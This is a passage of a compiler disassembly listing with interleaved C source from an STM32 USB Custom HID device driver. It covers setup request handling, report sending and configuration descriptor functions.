 8008852:	3b02      	subs	r3, #2
 8008854:	2b09      	cmp	r3, #9
 8008856:	d846      	bhi.n	80088e6 <USBD_CUSTOM_HID_Setup+0xde>
 8008858:	a201      	add	r2, pc, #4	; (adr r2, 8008860 <USBD_CUSTOM_HID_Setup+0x58>)
 800885a:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800885e:	bf00      	nop
 8008860:	080088b9 	.word	0x080088b9
 8008864:	08008897 	.word	0x08008897
 8008868:	080088e7 	.word	0x080088e7
 800886c:	080088e7 	.word	0x080088e7
 8008870:	080088e7 	.word	0x080088e7
 8008874:	080088e7 	.word	0x080088e7
 8008878:	080088e7 	.word	0x080088e7
 800887c:	080088c9 	.word	0x080088c9
 8008880:	080088a7 	.word	0x080088a7
 8008884:	08008889 	.word	0x08008889
      {
        case CUSTOM_HID_REQ_SET_PROTOCOL:
          hhid->Protocol = (uint8_t)(req->wValue);
 8008888:	683b      	ldr	r3, [r7, #0]
 800888a:	885b      	ldrh	r3, [r3, #2]
 800888c:	b2db      	uxtb	r3, r3
 800888e:	461a      	mov	r2, r3
 8008890:	693b      	ldr	r3, [r7, #16]
 8008892:	611a      	str	r2, [r3, #16]
          break;
 8008894:	e02e      	b.n	80088f4 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_PROTOCOL:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->Protocol, 1U);
 8008896:	693b      	ldr	r3, [r7, #16]
 8008898:	3310      	adds	r3, #16
 800889a:	2201      	movs	r2, #1
 800889c:	4619      	mov	r1, r3
 800889e:	6878      	ldr	r0, [r7, #4]
 80088a0:	f003 fd0e 	bl	800c2c0 <USBD_CtlSendData>
          break;
 80088a4:	e026      	b.n	80088f4 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_SET_IDLE:
          hhid->IdleState = (uint8_t)(req->wValue >> 8);
 80088a6:	683b      	ldr	r3, [r7, #0]
 80088a8:	885b      	ldrh	r3, [r3, #2]
 80088aa:	0a1b      	lsrs	r3, r3, #8
 80088ac:	b29b      	uxth	r3, r3
 80088ae:	b2db      	uxtb	r3, r3
 80088b0:	461a      	mov	r2, r3
 80088b2:	693b      	ldr	r3, [r7, #16]
 80088b4:	615a      	str	r2, [r3, #20]
          break;
 80088b6:	e01d      	b.n	80088f4 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_IDLE:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->IdleState, 1U);
 80088b8:	693b      	ldr	r3, [r7, #16]
 80088ba:	3314      	adds	r3, #20
 80088bc:	2201      	movs	r2, #1
 80088be:	4619      	mov	r1, r3
 80088c0:	6878      	ldr	r0, [r7, #4]
 80088c2:	f003 fcfd 	bl	800c2c0 <USBD_CtlSendData>
          break;
 80088c6:	e015      	b.n	80088f4 <USBD_CUSTOM_HID_Setup+0xec>
            ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->CtrlReqComplete(req->bRequest,
                                                                                            req->wLength);
          }
#endif /* USBD_CUSTOMHID_CTRL_REQ_COMPLETE_CALLBACK_ENABLED */
#ifndef USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED
          hhid->IsReportAvailable = 1U;
 80088c8:	693b      	ldr	r3, [r7, #16]
 80088ca:	2201      	movs	r2, #1
 80088cc:	61da      	str	r2, [r3, #28]
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 80088ce:	6939      	ldr	r1, [r7, #16]
                                  MIN(req->wLength, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE));
 80088d0:	683b      	ldr	r3, [r7, #0]
 80088d2:	88db      	ldrh	r3, [r3, #6]
 80088d4:	2b0f      	cmp	r3, #15
 80088d6:	bf28      	it	cs
 80088d8:	230f      	movcs	r3, #15
 80088da:	b29b      	uxth	r3, r3
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 80088dc:	461a      	mov	r2, r3
 80088de:	6878      	ldr	r0, [r7, #4]
 80088e0:	f003 fd1a 	bl	800c318 <USBD_CtlPrepareRx>
#endif /* USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED */
          break;
 80088e4:	e006      	b.n	80088f4 <USBD_CUSTOM_HID_Setup+0xec>
          }
          break;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */

        default:
          USBD_CtlError(pdev, req);
 80088e6:	6839      	ldr	r1, [r7, #0]
 80088e8:	6878      	ldr	r0, [r7, #4]
 80088ea:	f003 fc78 	bl	800c1de <USBD_CtlError>
          ret = USBD_FAIL;
 80088ee:	2303      	movs	r3, #3
 80088f0:	75fb      	strb	r3, [r7, #23]
          break;
 80088f2:	bf00      	nop
      }
      break;
 80088f4:	e09a      	b.n	8008a2c <USBD_CUSTOM_HID_Setup+0x224>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 80088f6:	683b      	ldr	r3, [r7, #0]
 80088f8:	785b      	ldrb	r3, [r3, #1]
 80088fa:	2b0b      	cmp	r3, #11
 80088fc:	f200 8086 	bhi.w	8008a0c <USBD_CUSTOM_HID_Setup+0x204>
 8008900:	a201      	add	r2, pc, #4	; (adr r2, 8008908 <USBD_CUSTOM_HID_Setup+0x100>)
 8008902:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008906:	bf00      	nop
 8008908:	08008939 	.word	0x08008939
 800890c:	08008a1b 	.word	0x08008a1b
 8008910:	08008a0d 	.word	0x08008a0d
 8008914:	08008a0d 	.word	0x08008a0d
 8008918:	08008a0d 	.word	0x08008a0d
 800891c:	08008a0d 	.word	0x08008a0d
 8008920:	08008963 	.word	0x08008963
 8008924:	08008a0d 	.word	0x08008a0d
 8008928:	08008a0d 	.word	0x08008a0d
 800892c:	08008a0d 	.word	0x08008a0d
 8008930:	080089bb 	.word	0x080089bb
 8008934:	080089e5 	.word	0x080089e5
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008938:	687b      	ldr	r3, [r7, #4]
 800893a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800893e:	b2db      	uxtb	r3, r3
 8008940:	2b03      	cmp	r3, #3
 8008942:	d107      	bne.n	8008954 <USBD_CUSTOM_HID_Setup+0x14c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8008944:	f107 030e 	add.w	r3, r7, #14
 8008948:	2202      	movs	r2, #2
 800894a:	4619      	mov	r1, r3
 800894c:	6878      	ldr	r0, [r7, #4]
 800894e:	f003 fcb7 	bl	800c2c0 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008952:	e063      	b.n	8008a1c <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008954:	6839      	ldr	r1, [r7, #0]
 8008956:	6878      	ldr	r0, [r7, #4]
 8008958:	f003 fc41 	bl	800c1de <USBD_CtlError>
            ret = USBD_FAIL;
 800895c:	2303      	movs	r3, #3
 800895e:	75fb      	strb	r3, [r7, #23]
          break;
 8008960:	e05c      	b.n	8008a1c <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_DESCRIPTOR:
          if ((req->wValue >> 8) == CUSTOM_HID_REPORT_DESC)
 8008962:	683b      	ldr	r3, [r7, #0]
 8008964:	885b      	ldrh	r3, [r3, #2]
 8008966:	0a1b      	lsrs	r3, r3, #8
 8008968:	b29b      	uxth	r3, r3
 800896a:	2b22      	cmp	r3, #34	; 0x22
 800896c:	d110      	bne.n	8008990 <USBD_CUSTOM_HID_Setup+0x188>
          {
            len = MIN(USBD_CUSTOM_HID_REPORT_DESC_SIZE, req->wLength);
 800896e:	683b      	ldr	r3, [r7, #0]
 8008970:	88db      	ldrh	r3, [r3, #6]
 8008972:	2b49      	cmp	r3, #73	; 0x49
 8008974:	bf28      	it	cs
 8008976:	2349      	movcs	r3, #73	; 0x49
 8008978:	83fb      	strh	r3, [r7, #30]
            pbuf = ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->pReport;
 800897a:	687b      	ldr	r3, [r7, #4]
 800897c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008980:	687a      	ldr	r2, [r7, #4]
 8008982:	33b0      	adds	r3, #176	; 0xb0
 8008984:	009b      	lsls	r3, r3, #2
 8008986:	4413      	add	r3, r2
 8008988:	685b      	ldr	r3, [r3, #4]
 800898a:	681b      	ldr	r3, [r3, #0]
 800898c:	61bb      	str	r3, [r7, #24]
 800898e:	e00d      	b.n	80089ac <USBD_CUSTOM_HID_Setup+0x1a4>
          }
          else
          {
            if ((req->wValue >> 8) == CUSTOM_HID_DESCRIPTOR_TYPE)
 8008990:	683b      	ldr	r3, [r7, #0]
 8008992:	885b      	ldrh	r3, [r3, #2]
 8008994:	0a1b      	lsrs	r3, r3, #8
 8008996:	b29b      	uxth	r3, r3
 8008998:	2b21      	cmp	r3, #33	; 0x21
 800899a:	d107      	bne.n	80089ac <USBD_CUSTOM_HID_Setup+0x1a4>
            {
              pbuf = USBD_CUSTOM_HID_Desc;
 800899c:	4b26      	ldr	r3, [pc, #152]	; (8008a38 <USBD_CUSTOM_HID_Setup+0x230>)
 800899e:	61bb      	str	r3, [r7, #24]
              len = MIN(USB_CUSTOM_HID_DESC_SIZ, req->wLength);
 80089a0:	683b      	ldr	r3, [r7, #0]
 80089a2:	88db      	ldrh	r3, [r3, #6]
 80089a4:	2b09      	cmp	r3, #9
 80089a6:	bf28      	it	cs
 80089a8:	2309      	movcs	r3, #9
 80089aa:	83fb      	strh	r3, [r7, #30]
            }
          }

          (void)USBD_CtlSendData(pdev, pbuf, len);
 80089ac:	8bfb      	ldrh	r3, [r7, #30]
 80089ae:	461a      	mov	r2, r3
 80089b0:	69b9      	ldr	r1, [r7, #24]
 80089b2:	6878      	ldr	r0, [r7, #4]
 80089b4:	f003 fc84 	bl	800c2c0 <USBD_CtlSendData>
          break;
 80089b8:	e030      	b.n	8008a1c <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80089ba:	687b      	ldr	r3, [r7, #4]
 80089bc:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80089c0:	b2db      	uxtb	r3, r3
 80089c2:	2b03      	cmp	r3, #3
 80089c4:	d107      	bne.n	80089d6 <USBD_CUSTOM_HID_Setup+0x1ce>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->AltSetting, 1U);
 80089c6:	693b      	ldr	r3, [r7, #16]
 80089c8:	3318      	adds	r3, #24
 80089ca:	2201      	movs	r2, #1
 80089cc:	4619      	mov	r1, r3
 80089ce:	6878      	ldr	r0, [r7, #4]
 80089d0:	f003 fc76 	bl	800c2c0 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80089d4:	e022      	b.n	8008a1c <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 80089d6:	6839      	ldr	r1, [r7, #0]
 80089d8:	6878      	ldr	r0, [r7, #4]
 80089da:	f003 fc00 	bl	800c1de <USBD_CtlError>
            ret = USBD_FAIL;
 80089de:	2303      	movs	r3, #3
 80089e0:	75fb      	strb	r3, [r7, #23]
          break;
 80089e2:	e01b      	b.n	8008a1c <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80089e4:	687b      	ldr	r3, [r7, #4]
 80089e6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80089ea:	b2db      	uxtb	r3, r3
 80089ec:	2b03      	cmp	r3, #3
 80089ee:	d106      	bne.n	80089fe <USBD_CUSTOM_HID_Setup+0x1f6>
          {
            hhid->AltSetting = (uint8_t)(req->wValue);
 80089f0:	683b      	ldr	r3, [r7, #0]
 80089f2:	885b      	ldrh	r3, [r3, #2]
 80089f4:	b2db      	uxtb	r3, r3
 80089f6:	461a      	mov	r2, r3
 80089f8:	693b      	ldr	r3, [r7, #16]
 80089fa:	619a      	str	r2, [r3, #24]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80089fc:	e00e      	b.n	8008a1c <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 80089fe:	6839      	ldr	r1, [r7, #0]
 8008a00:	6878      	ldr	r0, [r7, #4]
 8008a02:	f003 fbec 	bl	800c1de <USBD_CtlError>
            ret = USBD_FAIL;
 8008a06:	2303      	movs	r3, #3
 8008a08:	75fb      	strb	r3, [r7, #23]
          break;
 8008a0a:	e007      	b.n	8008a1c <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_CLEAR_FEATURE:
          break;

        default:
          USBD_CtlError(pdev, req);
 8008a0c:	6839      	ldr	r1, [r7, #0]
 8008a0e:	6878      	ldr	r0, [r7, #4]
 8008a10:	f003 fbe5 	bl	800c1de <USBD_CtlError>
          ret = USBD_FAIL;
 8008a14:	2303      	movs	r3, #3
 8008a16:	75fb      	strb	r3, [r7, #23]
          break;
 8008a18:	e000      	b.n	8008a1c <USBD_CUSTOM_HID_Setup+0x214>
          break;
 8008a1a:	bf00      	nop
      }
      break;
 8008a1c:	e006      	b.n	8008a2c <USBD_CUSTOM_HID_Setup+0x224>

    default:
      USBD_CtlError(pdev, req);
 8008a1e:	6839      	ldr	r1, [r7, #0]
 8008a20:	6878      	ldr	r0, [r7, #4]
 8008a22:	f003 fbdc 	bl	800c1de <USBD_CtlError>
      ret = USBD_FAIL;
 8008a26:	2303      	movs	r3, #3
 8008a28:	75fb      	strb	r3, [r7, #23]
      break;
 8008a2a:	bf00      	nop
  }
  return (uint8_t)ret;
 8008a2c:	7dfb      	ldrb	r3, [r7, #23]
}
 8008a2e:	4618      	mov	r0, r3
 8008a30:	3720      	adds	r7, #32
 8008a32:	46bd      	mov	sp, r7
 8008a34:	bd80      	pop	{r7, pc}
 8008a36:	bf00      	nop
 8008a38:	20000090 	.word	0x20000090

08008a3c <USBD_CUSTOM_HID_SendReport>:
{
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[ClassId];
#else
uint8_t USBD_CUSTOM_HID_SendReport(USBD_HandleTypeDef *pdev,
                                   uint8_t *report, uint16_t len)
{
 8008a3c:	b580      	push	{r7, lr}
 8008a3e:	b086      	sub	sp, #24
 8008a40:	af00      	add	r7, sp, #0
 8008a42:	60f8      	str	r0, [r7, #12]
 8008a44:	60b9      	str	r1, [r7, #8]
 8008a46:	4613      	mov	r3, r2
 8008a48:	80fb      	strh	r3, [r7, #6]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008a4a:	68fb      	ldr	r3, [r7, #12]
 8008a4c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008a50:	68fb      	ldr	r3, [r7, #12]
 8008a52:	32b0      	adds	r2, #176	; 0xb0
 8008a54:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008a58:	617b      	str	r3, [r7, #20]
#endif /* USE_USBD_COMPOSITE */

  if (hhid == NULL)
 8008a5a:	697b      	ldr	r3, [r7, #20]
 8008a5c:	2b00      	cmp	r3, #0
 8008a5e:	d101      	bne.n	8008a64 <USBD_CUSTOM_HID_SendReport+0x28>
  {
    return (uint8_t)USBD_FAIL;
 8008a60:	2303      	movs	r3, #3
 8008a62:	e019      	b.n	8008a98 <USBD_CUSTOM_HID_SendReport+0x5c>
#ifdef USE_USBD_COMPOSITE
  /* Get Endpoint IN address allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, ClassId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008a64:	68fb      	ldr	r3, [r7, #12]
 8008a66:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008a6a:	b2db      	uxtb	r3, r3
 8008a6c:	2b03      	cmp	r3, #3
 8008a6e:	d112      	bne.n	8008a96 <USBD_CUSTOM_HID_SendReport+0x5a>
  {
    if (hhid->state == CUSTOM_HID_IDLE)
 8008a70:	697b      	ldr	r3, [r7, #20]
 8008a72:	f893 3020 	ldrb.w	r3, [r3, #32]
 8008a76:	2b00      	cmp	r3, #0
 8008a78:	d10b      	bne.n	8008a92 <USBD_CUSTOM_HID_SendReport+0x56>
    {
      hhid->state = CUSTOM_HID_BUSY;
 8008a7a:	697b      	ldr	r3, [r7, #20]
 8008a7c:	2201      	movs	r2, #1
 8008a7e:	f883 2020 	strb.w	r2, [r3, #32]
      (void)USBD_LL_Transmit(pdev, CUSTOMHIDInEpAdd, report, len);
 8008a82:	4b07      	ldr	r3, [pc, #28]	; (8008aa0 <USBD_CUSTOM_HID_SendReport+0x64>)
 8008a84:	7819      	ldrb	r1, [r3, #0]
 8008a86:	88fb      	ldrh	r3, [r7, #6]
 8008a88:	68ba      	ldr	r2, [r7, #8]
 8008a8a:	68f8      	ldr	r0, [r7, #12]
 8008a8c:	f004 f9ea 	bl	800ce64 <USBD_LL_Transmit>
 8008a90:	e001      	b.n	8008a96 <USBD_CUSTOM_HID_SendReport+0x5a>
    }
    else
    {
      return (uint8_t)USBD_BUSY;
 8008a92:	2301      	movs	r3, #1
 8008a94:	e000      	b.n	8008a98 <USBD_CUSTOM_HID_SendReport+0x5c>
    }
  }
  return (uint8_t)USBD_OK;
 8008a96:	2300      	movs	r3, #0
}
 8008a98:	4618      	mov	r0, r3
 8008a9a:	3718      	adds	r7, #24
 8008a9c:	46bd      	mov	sp, r7
 8008a9e:	bd80      	pop	{r7, pc}
 8008aa0:	200000a6 	.word	0x200000a6

08008aa4 <USBD_CUSTOM_HID_GetFSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetFSCfgDesc(uint16_t *length)
{
 8008aa4:	b580      	push	{r7, lr}
 8008aa6:	b084      	sub	sp, #16
 8008aa8:	af00      	add	r7, sp, #0
 8008aaa:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008aac:	2181      	movs	r1, #129	; 0x81
 8008aae:	4815      	ldr	r0, [pc, #84]	; (8008b04 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008ab0:	f002 fd32 	bl	800b518 <USBD_GetEpDesc>
 8008ab4:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008ab6:	2101      	movs	r1, #1
 8008ab8:	4812      	ldr	r0, [pc, #72]	; (8008b04 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008aba:	f002 fd2d 	bl	800b518 <USBD_GetEpDesc>
 8008abe:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008ac0:	68fb      	ldr	r3, [r7, #12]
 8008ac2:	2b00      	cmp	r3, #0
 8008ac4:	d009      	beq.n	8008ada <USBD_CUSTOM_HID_GetFSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008ac6:	68fb      	ldr	r3, [r7, #12]
 8008ac8:	2200      	movs	r2, #0
 8008aca:	f042 0202 	orr.w	r2, r2, #2
 8008ace:	711a      	strb	r2, [r3, #4]
 8008ad0:	2200      	movs	r2, #0
 8008ad2:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008ad4:	68fb      	ldr	r3, [r7, #12]
 8008ad6:	2205      	movs	r2, #5
 8008ad8:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008ada:	68bb      	ldr	r3, [r7, #8]
 8008adc:	2b00      	cmp	r3, #0
 8008ade:	d009      	beq.n	8008af4 <USBD_CUSTOM_HID_GetFSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008ae0:	68bb      	ldr	r3, [r7, #8]
 8008ae2:	2200      	movs	r2, #0
 8008ae4:	f042 0202 	orr.w	r2, r2, #2
 8008ae8:	711a      	strb	r2, [r3, #4]
 8008aea:	2200      	movs	r2, #0
 8008aec:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008aee:	68bb      	ldr	r3, [r7, #8]
 8008af0:	2205      	movs	r2, #5
 8008af2:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008af4:	687b      	ldr	r3, [r7, #4]
 8008af6:	2229      	movs	r2, #41	; 0x29
 8008af8:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008afa:	4b02      	ldr	r3, [pc, #8]	; (8008b04 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
}
 8008afc:	4618      	mov	r0, r3
 8008afe:	3710      	adds	r7, #16
 8008b00:	46bd      	mov	sp, r7
 8008b02:	bd80      	pop	{r7, pc}
 8008b04:	20000064 	.word	0x20000064

08008b08 <USBD_CUSTOM_HID_GetHSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetHSCfgDesc(uint16_t *length)
{
 8008b08:	b580      	push	{r7, lr}
 8008b0a:	b084      	sub	sp, #16
 8008b0c:	af00      	add	r7, sp, #0
 8008b0e:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008b10:	2181      	movs	r1, #129	; 0x81
 8008b12:	4815      	ldr	r0, [pc, #84]	; (8008b68 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008b14:	f002 fd00 	bl	800b518 <USBD_GetEpDesc>
 8008b18:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008b1a:	2101      	movs	r1, #1
 8008b1c:	4812      	ldr	r0, [pc, #72]	; (8008b68 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008b1e:	f002 fcfb 	bl	800b518 <USBD_GetEpDesc>
 8008b22:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008b24:	68fb      	ldr	r3, [r7, #12]
 8008b26:	2b00      	cmp	r3, #0
 8008b28:	d009      	beq.n	8008b3e <USBD_CUSTOM_HID_GetHSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008b2a:	68fb      	ldr	r3, [r7, #12]
 8008b2c:	2200      	movs	r2, #0
 8008b2e:	f042 0202 	orr.w	r2, r2, #2
 8008b32:	711a      	strb	r2, [r3, #4]
 8008b34:	2200      	movs	r2, #0
 8008b36:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008b38:	68fb      	ldr	r3, [r7, #12]
 8008b3a:	2205      	movs	r2, #5
 8008b3c:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008b3e:	68bb      	ldr	r3, [r7, #8]
 8008b40:	2b00      	cmp	r3, #0
 8008b42:	d009      	beq.n	8008b58 <USBD_CUSTOM_HID_GetHSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008b44:	68bb      	ldr	r3, [r7, #8]
 8008b46:	2200      	movs	r2, #0
 8008b48:	f042 0202 	orr.w	r2, r2, #2
 8008b4c:	711a      	strb	r2, [r3, #4]
 8008b4e:	2200      	movs	r2, #0
 8008b50:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008b52:	68bb      	ldr	r3, [r7, #8]
 8008b54:	2205      	movs	r2, #5
 8008b56:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008b58:	687b      	ldr	r3, [r7, #4]
 8008b5a:	2229      	movs	r2, #41	; 0x29
 8008b5c:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008b5e:	4b02      	ldr	r3, [pc, #8]	; (8008b68 <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
}
 8008b60:	4618      	mov	r0, r3
 8008b62:	3710      	adds	r7, #16
 8008b64:	46bd      	mov	sp, r7
 8008b66:	bd80      	pop	{r7, pc}
 8008b68:	20000064 	.word	0x20000064

08008b6c <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8008b6c:	b580      	push	{r7, lr}
 8008b6e:	b084      	sub	sp, #16
 8008b70:	af00      	add	r7, sp, #0
 8008b72:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008b74:	2181      	movs	r1, #129	; 0x81
 8008b76:	4815      	ldr	r0, [pc, #84]	; (8008bcc <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008b78:	f002 fcce 	bl	800b518 <USBD_GetEpDesc>
 8008b7c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008b7e:	2101      	movs	r1, #1
 8008b80:	4812      	ldr	r0, [pc, #72]	; (8008bcc <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008b82:	f002 fcc9 	bl	800b518 <USBD_GetEpDesc>
 8008b86:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008b88:	68fb      	ldr	r3, [r7, #12]
 8008b8a:	2b00      	cmp	r3, #0
 8008b8c:	d009      	beq.n	8008ba2 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008b8e:	68fb      	ldr	r3, [r7, #12]
 8008b90:	2200      	movs	r2, #0
 8008b92:	f042 0202 	orr.w	r2, r2, #2
 8008b96:	711a      	strb	r2, [r3, #4]
 8008b98:	2200      	movs	r2, #0
 8008b9a:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008b9c:	68fb      	ldr	r3, [r7, #12]
 8008b9e:	2205      	movs	r2, #5
 8008ba0:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008ba2:	68bb      	ldr	r3, [r7, #8]
 8008ba4:	2b00      	cmp	r3, #0
 8008ba6:	d009      	beq.n	8008bbc <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008ba8:	68bb      	ldr	r3, [r7, #8]
 8008baa:	2200      	movs	r2, #0
 8008bac:	f042 0202 	orr.w	r2, r2, #2
 8008bb0:	711a      	strb	r2, [r3, #4]
 8008bb2:	2200      	movs	r2, #0
 8008bb4:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008bb6:	68bb      	ldr	r3, [r7, #8]
 8008bb8:	2205      	movs	r2, #5
 8008bba:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008bbc:	687b      	ldr	r3, [r7, #4]
 8008bbe:	2229      	movs	r2, #41	; 0x29
 8008bc0:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008bc2:	4b02      	ldr	r3, [pc, #8]	; (8008bcc <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
}
 8008bc4:	4618      	mov	r0, r3
 8008bc6:	3710      	adds	r7, #16
 8008bc8:	46bd      	mov	sp, r7
 8008bca:	bd80      	pop	{r7, pc}
 8008bcc:	20000064 	.word	0x20000064

08008bd0 <USBD_CUSTOM_HID_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008bd0:	b480      	push	{r7}
 8008bd2:	b083      	sub	sp, #12
 8008bd4:	af00      	add	r7, sp, #0
 8008bd6:	6078      	str	r0, [r7, #4]
 8008bd8:	460b      	mov	r3, r1
 8008bda:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  /* Ensure that the FIFO is empty before a new transfer, this condition could
  be caused by  a new transfer before the end of the previous transfer */
